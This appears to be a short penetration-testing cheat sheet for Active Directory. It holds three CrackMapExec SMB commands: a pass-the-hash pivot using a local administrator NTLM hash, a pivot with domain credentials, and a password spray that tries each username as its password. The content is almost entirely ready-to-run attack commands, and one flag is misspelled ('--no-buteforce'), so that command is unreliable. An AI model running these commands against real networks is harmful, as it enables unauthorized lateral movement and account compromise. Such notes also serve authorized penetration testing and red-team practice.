#### Pivot with local user

```
crackmapexec smb ad_hosts.txt -u administrator -H '11628d378a956b8ffc7e2c54b9a59574' --local-auth --continue-on-success
```

#### Pivot with domain user

```
crackmapexec smb ad_hosts.txt -d domain.com -u user -p password --continue-on-success
```

#### Password spray - username as password

```
crackmapexec smb ad_hosts.txt -d domain.com -u ad_user.txt -p ad_user.txt --continue-on-success --no-buteforce
```